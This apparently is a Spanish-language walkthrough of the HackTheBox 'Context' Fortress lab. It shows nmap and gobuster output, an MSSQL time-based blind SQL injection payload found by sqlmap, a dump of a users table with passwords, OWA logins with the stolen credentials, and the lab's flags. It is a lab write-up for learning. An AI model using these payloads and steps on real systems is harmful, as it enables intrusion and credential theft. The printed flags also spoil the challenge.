---
hidden: true
icon: arrow-right-to-arc
---

# Context Fortress HackTheBox

## Escaneo de puertos

```shell
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn <IP>
```

```shell
nmap -sCV -p<PORTS> <IP>
```

Info:

```
Starting Nmap 7.95 ( https://nmap.org ) at 2026-01-01 19:32 CET
Nmap scan report for 10.13.37.12
Host is up (0.038s latency).

PORT     STATE SERVICE       VERSION
443/tcp  open  ssl/https
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Home page - Home
| ssl-cert: Subject: commonName=WEB
| Subject Alternative Name: DNS:WEB, DNS:WEB.TEIGNTON.HTB
| Not valid before: 2025-10-13T09:12:27
|_Not valid after:  2030-10-13T09:12:27
1433/tcp open  ms-sql-s      Microsoft SQL Server 2019 15.00.2070.00; GDR1
| ms-sql-info:
|   10.13.37.12:1433:
|     Version:
|       name: Microsoft SQL Server 2019 GDR1
|       number: 15.00.2070.00
|       Product: Microsoft SQL Server 2019
|       Service pack level: GDR1
|       Post-SP patches applied: false
|_    TCP port: 1433
| ms-sql-ntlm-info:
|   10.13.37.12:1433:
|     Target_Name: TEIGNTON
|     NetBIOS_Domain_Name: TEIGNTON
|     NetBIOS_Computer_Name: WEB
|     DNS_Domain_Name: TEIGNTON.HTB
|     DNS_Computer_Name: WEB.TEIGNTON.HTB
|     DNS_Tree_Name: TEIGNTON.HTB
|_    Product_Version: 10.0.17763
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| ssl-cert: Subject: commonName=WEB.TEIGNTON.HTB
| Not valid before: 2025-10-10T06:30:07
|_Not valid after:  2026-04-11T06:30:07
| rdp-ntlm-info:
|   Target_Name: TEIGNTON
|   NetBIOS_Domain_Name: TEIGNTON
|   NetBIOS_Computer_Name: WEB
|   DNS_Domain_Name: TEIGNTON.HTB
|   DNS_Computer_Name: WEB.TEIGNTON.HTB
|   DNS_Tree_Name: TEIGNTON.HTB
|   Product_Version: 10.0.17763
|_  System_Time: 2026-01-01T19:33:18+00:00
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 1h00m06s, deviation: 0s, median: 1h00m06s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 72.27 seconds
```

Veremos varias cosas interesantes, entre toda esta informacion veremos un dominio general llamado `TEIGNTON.HTB` el cual añadiremos al archivo `hosts` junto con otros `subdominios` mas que tambien veremos como `WEB.TEIGNTON.HTB`. de primeras veremos que es un `Windows Server`.

```shell
nano /etc/hosts

#Dentro del nano
<IP>             teignton.htb web.teignton.htb
```

Lo guardaremos y entraremos a la pagina principal que es el `subdominio` `web.teignton.htb` el cual va por `SSL (HTTPS)`, por lo que entraremos de esta forma:

```
URL = https://web.teignton.htb/
```

Info:

<figure><img src="../../.gitbook/assets/Pasted image 20260101193820.png" alt=""><figcaption></figcaption></figure>

Veremos algo normal, pero si bajamos un poco veremos lo siguiente:

```
 Administrators please log in here
```

## But we have SSL!?

Si pinchamos aqui, nos llevara a la ruta `/Admin` el cual sera un `login` de `admin`, despues si seguimos investigando un poco veremos `Products` el cual vemos que va por el servidor `SQL` que tiene expuesto la victima, tambien si vamos a `Staff` veremos varios nombres los cuales nos vamos a guardar ya que pueden ser posibles usuarios.

> users.txt

```
Andy.Teignton
Jay.Teignton
Karl.Memaybe
Abbie.Buckfast
andy.teignton
jay.teignton
karl.memaybe
abbie.buckfast
```

Y por ultimo en `Contact` veremos lo siguiente:

```
The Son: Jay.Teignton@Teignton.com
The Father: Andy.Teignton@Teignton.com 
```

Esto tambien es informacion util para saber como estan formados los correos o los usuarios.

Estando en la pagina de `Staff` si inspeccionamos el codigo veremos lo siguiente:

```html
<!-- TODO: Set up Abbie on the portal, she'll be taking over my duties while I'm away.
Karl if I forget to do this, it's jay.teignton:admin for the portal
CONTEXT{s3cur1ty_thr0ugh_0bscur1ty}
-->
```

Vemos un comentario con la primera `flag`.

> But we have SSL!? (Flag)

```
CONTEXT{s3cur1ty_thr0ugh_0bscur1ty}
```

## That shouldn't be there...

Esa nota que hemos visto antes nos da la pista de que `jay.teignton` es el `admin` y tiene las instrucciones de configurar el usuario `abbie`.

Vamos a probar lo que parecen ser unas credenciales `jay.teignton:admin` en el apartado de `/Admin`, si las probamos, veremos que si funcionan y veremos una pestaña llamada `Management`, que dentro veremos lo siguiente:

<figure><img src="../../.gitbook/assets/Pasted image 20260101201423.png" alt=""><figcaption></figcaption></figure>

Vemos que podemos añadir productos y eliminarlos, vamos a probar a realizar una busqueda de un `SQLi` a la hora de añadir un producto con la herramienta de `sqlmap` de esta forma:

Primero tendremos que capturar la peticion con `BurpSuite` de cuando añadimos un producto viendose asi:

```
POST /Admin/AddProduct HTTP/2
Host: web.teignton.htb
Cookie: .AspNetCore.Antiforgery.oS4Q00mERc0=CfDJ8ByRjH1QXFhAthpdYuKqgwbSVLe4xRlan9T1dBGSrktB2FboIip4z756Qf70WXTkUQ8h-xK7kbG-P0cPgpQ05g7qEmbfP2GvWC8a7Ot6wOFQOY-w8-iILWLde9rQnW5Y3Amza_7ITD8EyPNAHGoQFbs; .AspNetCore.Session=CfDJ8ByRjH1QXFhAthpdYuKqgwZulFXc5JslsbJQ3snhFVf9nwOu0yE480%2BTF1hLN4TDgvwS0YfG7ZjgeZwo4FdmXVly6FjcM6CZj2V536tGaKYPpe8UfeBrRDUdBJS2vpLI8Jk32Eqvt8V4hvADHK4kktcurBSiNmz9CaRTh%2F8ZfcFi
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 230
Origin: https://web.teignton.htb
Dnt: 1
Referer: https://web.teignton.htb/Admin/DeleteProduct
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Priority: u=0, i
Te: trailers

name=Test&price=1&creationYear=2020&certified=2&__RequestVerificationToken=CfDJ8ByRjH1QXFhAthpdYuKqgwaUTkMmdKl4HF7QKZ6nio60eKAzvQg3NRwzneepdiCmHdl5dTpnTcMtnnbDhUDgBiDPAX3y2GqcUEzfpVy7dd1bX67eN62BmvFc-NPciS3i_MfMYV0Q9kNagSZtEndDugw
```

Ahora esta peticion la guardaremos en un `req.txt` y la utilizaremos unicamente para identificar si tiene alguna vulnerabilidad o no utilizando diferentes tecnicas relacionadas con la `DDBB` de `MSSQL` ya que es la que esta utilizando como identificamos anteriormente, primero probaremos el parametro `name`, ya que si probamos otros parametros no dara resultado.

```shell
sqlmap -r req.txt -p name --dbms=mssql --level=5 --risk=3 --technique=BEUSTQ --batch --force-ssl --time-sec=5 --union-cols=1-10 --union-char=123
```

Info:

```
        ___
       __H__
 ___ ___[)]_____ ___ ___  {1.9.10#stable}
|_ -| . [,]     | .'| . |
|___|_  [']_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 20:59:36 /2026-01-01/

[20:59:36] [INFO] parsing HTTP request from 'req.txt'
[20:59:36] [INFO] testing connection to the target URL
[20:59:36] [INFO] testing if the target URL content is stable
[20:59:37] [WARNING] target URL content is not stable (i.e. content differs). sqlmap will base the page comparison on a sequence matcher. If no dynamic nor injectable parameters are detected, or in case of junk results, refer to user's manual paragraph 'Page comparison'
how do you want to proceed? [(C)ontinue/(s)tring/(r)egex/(q)uit] C
[20:59:37] [INFO] searching for dynamic content
[20:59:37] [INFO] dynamic content marked for removal (6 regions)
[20:59:37] [WARNING] heuristic (basic) test shows that POST parameter 'name' might not be injectable
[20:59:38] [INFO] testing for SQL injection on POST parameter 'name'
[20:59:38] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[20:59:39] [WARNING] reflective value(s) found and filtering out
[21:00:20] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause'
[21:00:46] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT)'
[21:01:31] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (subquery - comment)'
[21:02:07] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (subquery - comment)'
[21:02:18] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (comment)'
[21:02:24] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (comment)'
[21:02:29] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT - comment)'
[21:02:36] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
[21:02:37] [INFO] testing 'Boolean-based blind - Parameter replace (DUAL)'
[21:02:38] [INFO] testing 'Boolean-based blind - Parameter replace (DUAL - original value)'
[21:02:39] [INFO] testing 'Boolean-based blind - Parameter replace (CASE)'
[21:02:40] [INFO] testing 'Boolean-based blind - Parameter replace (CASE - original value)'
[21:02:40] [INFO] testing 'HAVING boolean-based blind - WHERE, GROUP BY clause'
[21:03:14] [INFO] testing 'Generic inline queries'
[21:03:14] [INFO] testing 'Microsoft SQL Server/Sybase boolean-based blind - Parameter replace'
[21:03:15] [INFO] testing 'Microsoft SQL Server/Sybase boolean-based blind - Parameter replace (original value)'
[21:03:16] [INFO] testing 'Microsoft SQL Server/Sybase boolean-based blind - ORDER BY clause'
[21:03:18] [INFO] testing 'Microsoft SQL Server/Sybase boolean-based blind - ORDER BY clause (original value)'
[21:03:19] [INFO] testing 'Microsoft SQL Server/Sybase boolean-based blind - Stacked queries (IF)'
[21:03:41] [INFO] testing 'Microsoft SQL Server/Sybase boolean-based blind - Stacked queries'
[21:04:02] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)'
[21:04:14] [INFO] testing 'Microsoft SQL Server/Sybase OR error-based - WHERE or HAVING clause (IN)'
[21:04:23] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (CONVERT)'
[21:04:35] [INFO] testing 'Microsoft SQL Server/Sybase OR error-based - WHERE or HAVING clause (CONVERT)'
[21:04:44] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (CONCAT)'
[21:04:56] [INFO] testing 'Microsoft SQL Server/Sybase OR error-based - WHERE or HAVING clause (CONCAT)'
[21:05:05] [INFO] testing 'Microsoft SQL Server/Sybase error-based - Parameter replace'
[21:05:05] [INFO] testing 'Microsoft SQL Server/Sybase error-based - Parameter replace (integer column)'
[21:05:05] [INFO] testing 'Microsoft SQL Server/Sybase error-based - ORDER BY clause'
[21:05:06] [INFO] testing 'Microsoft SQL Server/Sybase error-based - Stacking (EXEC)'
[21:05:12] [INFO] testing 'Microsoft SQL Server/Sybase inline queries'
[21:05:12] [INFO] testing 'Microsoft SQL Server/Sybase stacked queries (comment)'
[21:05:18] [INFO] testing 'Microsoft SQL Server/Sybase stacked queries (DECLARE - comment)'
[21:05:23] [INFO] testing 'Microsoft SQL Server/Sybase stacked queries'
[21:05:33] [INFO] testing 'Microsoft SQL Server/Sybase stacked queries (DECLARE)'
[21:05:42] [INFO] testing 'Microsoft SQL Server/Sybase time-based blind (IF)'
[21:05:54] [INFO] testing 'Microsoft SQL Server/Sybase time-based blind (IF - comment)'
[21:06:04] [INFO] testing 'Microsoft SQL Server/Sybase AND time-based blind (heavy query)'
[21:06:11] [INFO] POST parameter 'name' appears to be 'Microsoft SQL Server/Sybase AND time-based blind (heavy query)' injectable
[21:06:11] [INFO] testing 'Generic UNION query (123) - 1 to 10 columns (custom)'
[21:06:11] [INFO] checking if the injection point on POST parameter 'name' is a false positive
POST parameter 'name' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
sqlmap identified the following injection point(s) with a total of 1524 HTTP(s) requests:
---
Parameter: name (POST)
    Type: time-based blind
    Title: Microsoft SQL Server/Sybase AND time-based blind (heavy query)
    Payload: name=Test'+(SELECT CHAR(74)+CHAR(87)+CHAR(88)+CHAR(68) WHERE 8663=8663 AND 9691=(SELECT COUNT(*) FROM sysusers AS sys1,sysusers AS sys2,sysusers AS sys3,sysusers AS sys4,sysusers AS sys5,sysusers AS sys6,sysusers AS sys7))+'&price=1&creationYear=2020&certified=2&__RequestVerificationToken=CfDJ8ByRjH1QXFhAthpdYuKqgwaUTkMmdKl4HF7QKZ6nio60eKAzvQg3NRwzneepdiCmHdl5dTpnTcMtnnbDhUDgBiDPAX3y2GqcUEzfpVy7dd1bX67eN62BmvFc-NPciS3i_MfMYV0Q9kNagSZtEndDugw
---
[21:06:24] [INFO] testing Microsoft SQL Server
[21:06:24] [WARNING] it is very important to not stress the network connection during usage of time-based payloads to prevent potential disruptions
[21:06:25] [INFO] confirming Microsoft SQL Server
[21:06:26] [INFO] the back-end DBMS is Microsoft SQL Server
web server operating system: Windows 2022 or 10 or 11 or 2016 or 2019
web application technology: Microsoft IIS 10.0
back-end DBMS: Microsoft SQL Server 2019
[21:06:26] [INFO] fetched data logged to text files under '/root/.local/share/sqlmap/output/web.teignton.htb'

[*] ending @ 21:06:26 /2026-01-01/
```

Pasado un rato veremos que efectivamente si es vulnerable justamente con el `payload` que encima es una vulnerabilidad basada en tiempo de respuesta (`Blind SQLi`)...

```sql
Test'+(SELECT CHAR(74)+CHAR(87)+CHAR(88)+CHAR(68) WHERE 8663=8663 AND 9691=(SELECT COUNT(*) FROM sysusers AS sys1,sysusers AS sys2,sysusers AS sys3,sysusers AS sys4,sysusers AS sys5,sysusers AS sys6,sysusers AS sys7))+'&
```

Por lo que vamos a identificar que `DDBB` tenemos actualmente de esta forma:

```shell
sqlmap -r req.txt -p name --dbms=mssql --batch --force-ssl --current-db
```

Info:

```
        ___
       __H__
 ___ ___[,]_____ ___ ___  {1.9.10#stable}
|_ -| . [']     | .'| . |
|___|_  [)]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 21:07:22 /2026-01-01/

[21:07:22] [INFO] parsing HTTP request from 'req.txt'
[21:07:22] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: name (POST)
    Type: time-based blind
    Title: Microsoft SQL Server/Sybase AND time-based blind (heavy query)
    Payload: name=Test'+(SELECT CHAR(74)+CHAR(87)+CHAR(88)+CHAR(68) WHERE 8663=8663 AND 9691=(SELECT COUNT(*) FROM sysusers AS sys1,sysusers AS sys2,sysusers AS sys3,sysusers AS sys4,sysusers AS sys5,sysusers AS sys6,sysusers AS sys7))+'&price=1&creationYear=2020&certified=2&__RequestVerificationToken=CfDJ8ByRjH1QXFhAthpdYuKqgwaUTkMmdKl4HF7QKZ6nio60eKAzvQg3NRwzneepdiCmHdl5dTpnTcMtnnbDhUDgBiDPAX3y2GqcUEzfpVy7dd1bX67eN62BmvFc-NPciS3i_MfMYV0Q9kNagSZtEndDugw
---
[21:07:22] [INFO] testing Microsoft SQL Server
[21:07:22] [INFO] confirming Microsoft SQL Server
[21:07:22] [INFO] the back-end DBMS is Microsoft SQL Server
web server operating system: Windows 2022 or 10 or 2016 or 2019 or 11
web application technology: Microsoft IIS 10.0
back-end DBMS: Microsoft SQL Server 2019
[21:07:22] [INFO] fetching current database
[21:07:22] [WARNING] time-based comparison requires larger statistical model, please wait.............................. (done)
do you want sqlmap to try to optimize value(s) for DBMS delay responses (option '--time-sec')? [Y/n] Y
[21:07:31] [WARNING] it is very important to not stress the network connection during usage of time-based payloads to prevent potential disruptions
webapp
current database: 'webapp'
[21:07:52] [INFO] fetched data logged to text files under '/root/.local/share/sqlmap/output/web.teignton.htb'

[*] ending @ 21:07:52 /2026-01-01/
```

Veremos que estamos en la `webapp` a nivel de `DDBB`, por lo que vamos a ver cuantas tablas tiene dicha base de datos.

```shell
sqlmap -r req.txt -p name --dbms=mssql --batch --force-ssl -D webapp --tables --no-cast --time-sec=5 --threads=1
```

Info:

```
       ___
       __H__
 ___ ___[,]_____ ___ ___  {1.9.10#stable}
|_ -| . [)]     | .'| . |
|___|_  [(]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 21:54:26 /2026-01-01/

[21:54:26] [INFO] parsing HTTP request from 'req.txt'
[21:54:26] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: name (POST)
    Type: time-based blind
    Title: Microsoft SQL Server/Sybase AND time-based blind (heavy query)
    Payload: name=Test'+(SELECT CHAR(110)+CHAR(100)+CHAR(105)+CHAR(119) WHERE 2933=2933 AND 2866=(SELECT COUNT(*) FROM sysusers AS sys1,sysusers AS sys2,sysusers AS sys3,sysusers AS sys4,sysusers AS sys5,sysusers AS sys6,sysusers AS sys7))+'&price=1&creationYear=2020&certified=2&__RequestVerificationToken=CfDJ8ByRjH1QXFhAthpdYuKqgwaUTkMmdKl4HF7QKZ6nio60eKAzvQg3NRwzneepdiCmHdl5dTpnTcMtnnbDhUDgBiDPAX3y2GqcUEzfpVy7dd1bX67eN62BmvFc-NPciS3i_MfMYV0Q9kNagSZtEndDugw
---
[21:54:26] [INFO] testing Microsoft SQL Server
[21:54:26] [INFO] confirming Microsoft SQL Server
[21:54:26] [INFO] the back-end DBMS is Microsoft SQL Server
web server operating system: Windows 2022 or 2019 or 10 or 2016 or 11
web application technology: Microsoft IIS 10.0
back-end DBMS: Microsoft SQL Server 2019
[21:54:26] [INFO] fetching tables for database: webapp
[21:54:26] [INFO] fetching number of tables for database 'webapp'
[21:54:26] [WARNING] time-based comparison requires larger statistical model, please wait.............................. (done)
[21:54:35] [WARNING] it is very important to not stress the network connection during usage of time-based payloads to prevent potential disruptions
2
[21:54:37] [WARNING] (case) time-based comparison requires reset of statistical model, please wait.............................. (done)
dbo.products
[21:55:29] [INFO] retrieved: dbo.users
Database: webapp
[2 tables]
+----------+
| products |
| users    |
+----------+

[21:55:50] [INFO] fetched data logged to text files under '/root/.local/share/sqlmap/output/web.teignton.htb'

[*] ending @ 21:55:50 /2026-01-01/
```

Veremos que tenemos solamente dos tablas llamadas `products` y `users`, vamos extraer la informacion de `users`.

```shell
sqlmap -r req.txt -p name --dbms=mssql --batch --force-ssl -D webapp -T users --dump --time-sec=3
```

Info:

```
        ___
       __H__
 ___ ___[.]_____ ___ ___  {1.9.10#stable}
|_ -| . [.]     | .'| . |
|___|_  [(]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 21:57:53 /2026-01-01/

[21:57:53] [INFO] parsing HTTP request from 'req.txt'
[21:57:53] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: name (POST)
    Type: time-based blind
    Title: Microsoft SQL Server/Sybase AND time-based blind (heavy query)
    Payload: name=Test'+(SELECT CHAR(110)+CHAR(100)+CHAR(105)+CHAR(119) WHERE 2933=2933 AND 2866=(SELECT COUNT(*) FROM sysusers AS sys1,sysusers AS sys2,sysusers AS sys3,sysusers AS sys4,sysusers AS sys5,sysusers AS sys6,sysusers AS sys7))+'&price=1&creationYear=2020&certified=2&__RequestVerificationToken=CfDJ8ByRjH1QXFhAthpdYuKqgwaUTkMmdKl4HF7QKZ6nio60eKAzvQg3NRwzneepdiCmHdl5dTpnTcMtnnbDhUDgBiDPAX3y2GqcUEzfpVy7dd1bX67eN62BmvFc-NPciS3i_MfMYV0Q9kNagSZtEndDugw
---
[21:57:53] [INFO] testing Microsoft SQL Server
[21:57:53] [INFO] confirming Microsoft SQL Server
[21:57:53] [INFO] the back-end DBMS is Microsoft SQL Server
web server operating system: Windows 2016 or 2019 or 2022 or 11 or 10
web application technology: Microsoft IIS 10.0
back-end DBMS: Microsoft SQL Server 2019
[21:57:53] [INFO] fetching columns for table 'users' in database 'webapp'
[21:57:53] [WARNING] time-based comparison requires larger statistical model, please wait.............................. (done)
[21:58:02] [WARNING] it is very important to not stress the network connection during usage of time-based payloads to prevent potential disruptions
5
[21:58:05] [WARNING] (case) time-based comparison requires reset of statistical model, please wait.............................. (done)
f
[21:58:22] [ERROR] invalid character detected. retrying..
irst_name
[21:58:55] [INFO] retrieved: id
[21:59:04] [INFO] retrieved: last_name
[21:59:37] [INFO] retrieved: password
[22:00:08] [INFO] retrieved: usern
[22:00:28] [ERROR] invalid character detected. retrying..
ame
[22:00:38] [INFO] fetching entries for table 'users' in database 'webapp'
[22:00:38] [INFO] fetching number of entries for table 'users' in database 'webapp'
[22:00:38] [INFO] retrieved: 3
[22:00:42] [WARNING] in case of table dumping problems (e.g. column entry order) you are advised to rerun with '--force-pivoting'
[22:00:42] [WARNING] (case) time-based comparison requires reset of statistical model, please wait.............................. (done)
Jay
[22:01:05] [INFO] retrieved: 1
[22:01:09] [INFO] retrieved: Teignton
[22:01:38] [INFO] retrieved: admin
[22:01:56] [INFO] retrieved: jay.teignton
[22:02:39] [INFO] retrieved: Abbie
[22:02:56] [INFO] retrieved: 2
[22:03:01] [INFO] retrieved: Buckf
[22:03:20] [ERROR] invalid character detected. retrying..
ast
[22:03:30] [INFO] retrieved: AMkru$3_f'/Q^7f?
[22:04:35] [INFO] retrieved: abbie.buckf
[22:05:15] [ERROR] invalid character detected. retrying..
ast
[22:05:25] [INFO] retrieved: testing
[22:05:52] [INFO] retrieved: 3
[22:05:56] [INFO] retrieved: teste
[22:06:19] [ERROR] invalid character detected. retrying..
r
[22:06:23] [INFO] retrieved: CONTEXT{d0_it_st0p_it_br34k_it_f1x_it}
[22:09:04] [INFO] retrieved: test
Database: webapp
Table: users
[3 entries]
+----+----------------------------------------+----------------+-----------+------------+
| id | password                               | username       | last_name | first_name |
+----+----------------------------------------+----------------+-----------+------------+
| 1  | admin                                  | jay.teignton   | Teignton  | Jay        |
| 2  | AMkru$3_f'/Q^7f?                       | abbie.buckfast | Buckfast  | Abbie      |
| 3  | CONTEXT{d0_it_st0p_it_br34k_it_f1x_it} | test           | tester    | testing    |
+----+----------------------------------------+----------------+-----------+------------+

[22:09:19] [INFO] table 'webapp.dbo.users' dumped to CSV file '/root/.local/share/sqlmap/output/web.teignton.htb/dump/webapp/users.csv'
[22:09:19] [INFO] fetched data logged to text files under '/root/.local/share/sqlmap/output/web.teignton.htb'

[*] ending @ 22:09:19 /2026-01-01/
```

Veremos que ha funcionado y hemos obtenido la siguiente `flag` juntos con las credenciales de algunos usuarios, como por ejemplo de `Abbie`.

> That shouldn't be there... (Flag)

```
CONTEXT{d0_it_st0p_it_br34k_it_f1x_it}
```

## Have we met before?

Como hemos visto antes tenemos las siguientes credenciales:

```
User: abbie.buckfast
Pass: AMkru$3_f'/Q^7f?
```

Sabiendo esto despues de estar un rato investigando, si realizamos un poco de `fuzzing` en la `web` veremos lo siguiente:

### Gobuster

```shell
gobuster dir -url https://web.teignton.htb/ -w <WORDLIST> -x html,txt,php -t 100 -k -r
```

Info:

```
===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     https://web.teignton.htb/
[+] Method:                  GET
[+] Threads:                 100
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8
[+] Extensions:              php,html,txt
[+] Follow Redirect:         true
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/home                 (Status: 200) [Size: 2548]
/admin                (Status: 200) [Size: 2879]
/Home                 (Status: 200) [Size: 2548]
/api                  (Status: 401) [Size: 0]
/%20.txt              (Status: 400) [Size: 3490]
/%20.php              (Status: 400) [Size: 3490]
/%20                  (Status: 400) [Size: 3490]
/%20.html             (Status: 400) [Size: 3490]
/rpc                  (Status: 401) [Size: 0]
/Admin                (Status: 200) [Size: 2879]
/*checkout*           (Status: 400) [Size: 3490]
/*checkout*.php       (Status: 400) [Size: 3490]
/*checkout*.txt       (Status: 400) [Size: 3490]
/*checkout*.html      (Status: 400) [Size: 3490]
/owa                  (Status: 200) [Size: 58715]
/HOME                 (Status: 200) [Size: 2548]
/API                  (Status: 401) [Size: 0]
/*docroot*            (Status: 400) [Size: 3490]
/*docroot*.html       (Status: 400) [Size: 3490]
/*docroot*.txt        (Status: 400) [Size: 3490]
/*docroot*.php        (Status: 400) [Size: 3490]
/*.html               (Status: 400) [Size: 3490]
/*.php                (Status: 400) [Size: 3490]
/*.txt                (Status: 400) [Size: 3490]
/*                    (Status: 400) [Size: 3490]
Progress: 81757 / 882236 (9.27%)
```

De toda esta informacion que vemos nos interesa el directorio llamado `/owa`, si entramos dentro...

```
URL = https://web.teignton.htb/owa
```

Info:

<figure><img src="../../.gitbook/assets/Pasted image 20260102100810.png" alt=""><figcaption></figcaption></figure>

Veremos que es una pagina de `Outlook` un servicio de correo, por lo que vamos a probar las credenciales que obtuvimos en dicho `login` a ver si funciona, si las probamos veremos que funcionan y veremos lo siguiente:

```
Domain/user name: teignton\abbie.buckfast
Password: AMkru$3_f'/Q^7f?
```

<figure><img src="../../.gitbook/assets/Pasted image 20260102101025.png" alt=""><figcaption></figcaption></figure>

Veremos que funciono, si nos vamos donde nuestro perfil veremos una opcion llamada `Open another mailbox...`, lo cual es interesante, ya que nos da a entender que podemos ver los correos de otros usuarios.

<figure><img src="../../.gitbook/assets/Pasted image 20260102113046.png" alt=""><figcaption></figcaption></figure>

Si le damos podremos escribir el usuario de `email` que queremos observar, para saber que usuarios hay podremos darle al boton de `9 puntos` y veremos lo siguiente:

<figure><img src="../../.gitbook/assets/Pasted image 20260102113152.png" alt=""><figcaption></figcaption></figure>

Si nos vamos a la seccion de `People` en la seccion de `Directory` podremos ver todo los usuarios que hay:

<figure><img src="../../.gitbook/assets/Pasted image 20260102113231.png" alt=""><figcaption></figcaption></figure>

Podemos probar a entrar en dichos usuarios a ver que vemos de interesante en sus correos, pero veremos que solamente podremos entrar en un usuario, este sera `jay.teignton`, entrando dentro del mismo veremos lo siguiente:

<figure><img src="../../.gitbook/assets/Pasted image 20260102113542.png" alt=""><figcaption></figcaption></figure>

Veremos que dentro de este usuario hay un correo en concreto que llama la atencion, el cual contiene un archivo `ZIP` que parece ser la aplicacion web ya que en el correo lo comenta.

Tambien si nos vamos a `Send Items` veremos que hay uno que pone `flag.txt` que sera la `flag`.

<figure><img src="../../.gitbook/assets/Pasted image 20260102121254.png" alt=""><figcaption></figcaption></figure>

Con esto veremos la `flag`.

> Have we met before? (Flag)

```
CONTEXT{wh00000_4re_y0u?}
```

## Is it a bird? Is it a plane?

<figure><img src="../../.gitbook/assets/Pasted image 20260102113813.png" alt=""><figcaption></figcaption></figure>

Si seguimos leyendo los correos, veremos que hay una vulnerabilidad a nivel de codigo, vamos a descargarnos el `ZIP`, descomprimirlo y leer dicho codigo a ver que vemos.

```shell
unzip WebApplication.zip
cd WebApplication/
```

Si listamos la carpeta...

```
drwxr-xr-x root root 4.0 KB Fri Jan  2 11:39:17 2026 .
drwxr-xr-x root root 4.0 KB Fri Jan  2 11:39:17 2026 ..
drwxr-xr-x root root 4.0 KB Tue Jun  9 11:30:32 2020 App_Data
drwxr-xr-x root root 4.0 KB Wed Jul 29 12:09:18 2020 App_Start
drwxr-xr-x root root 4.0 KB Sun Jul 12 20:38:38 2020 bin
drwxr-xr-x root root 4.0 KB Wed Jul 29 12:09:18 2020 Content
drwxr-xr-x root root 4.0 KB Wed Jul 29 12:09:18 2020 Controllers
drwxr-xr-x root root 4.0 KB Wed Jul 29 12:09:18 2020 fonts
drwxr-xr-x root root 4.0 KB Tue Jun  9 11:30:32 2020 Models
drwxr-xr-x root root 4.0 KB Wed Jul 29 12:09:18 2020 obj
drwxr-xr-x root root 4.0 KB Wed Jul 29 12:09:18 2020 Properties
drwxr-xr-x root root 4.0 KB Wed Jul 29 12:09:18 2020 Scripts
drwxr-xr-x root root 4.0 KB Wed Jul 29 12:09:18 2020 Views
.rw-r--r-- root root 906 B  Wed Jul 29 12:09:18 2020 Database.cs
.rw-r--r-- root root  31 KB Wed Jul 29 12:09:18 2020 favicon.ico
.rw-r--r-- root root 105 B  Wed Jul 29 12:09:18 2020 Global.asax
.rw-r--r-- root root 563 B  Wed Jul 29 12:09:18 2020 Global.asax.cs
.rw-r--r-- root root 562 B  Wed Jul 29 12:25:48 2020 LICENCE.txt
.rw-r--r-- root root 1.2 KB Wed Jul 29 12:09:18 2020 packages.config
.rw-r--r-- root root 312 B  Wed Jul 29 12:09:18 2020 Profile.cs
.rw-r--r-- root root 3.2 KB Wed Jul 29 12:09:18 2020 Web.config
.rw-r--r-- root root 1.2 KB Wed Jul 29 12:09:18 2020 Web.Debug.config
.rw-r--r-- root root 1.3 KB Wed Jul 29 12:09:18 2020 Web.Release.config
.rw-r--r-- root root  12 KB Wed Jul 29 12:09:18 2020 WebApplication.csproj
.rw-r--r-- root root 1.4 KB Wed Jul 29 12:09:18 2020 WebApplication.csproj.user
```

